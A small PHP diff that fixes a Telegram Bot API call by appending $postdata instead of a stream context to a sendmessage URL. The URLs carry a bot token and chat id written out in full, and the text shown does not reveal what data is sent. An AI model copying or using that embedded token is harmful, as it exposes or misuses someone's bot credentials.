@@ -23,7 +23,7 @@ $opts = array('http' =>
 );
 
 $context  = stream_context_create($opts);
-$data = "https://api.telegram.org/bot329586540:AAEaZ-91maCKl87zFX9r-PlGs-vIkaIfEUA/sendmessage?chat_id=94036610&text=salam".$context;
+$data = "https://api.telegram.org/bot329586540:AAEaZ-91maCKl87zFX9r-PlGs-vIkaIfEUA/sendmessage?chat_id=94036610&text=salam".$postdata;
 $response = file_get_contents($data);
 $result = file_get_contents('https://api.telegram.org/bot329586540:AAEaZ-91maCKl87zFX9r-PlGs-vIkaIfEUA/sendmessage', false, $context);
 
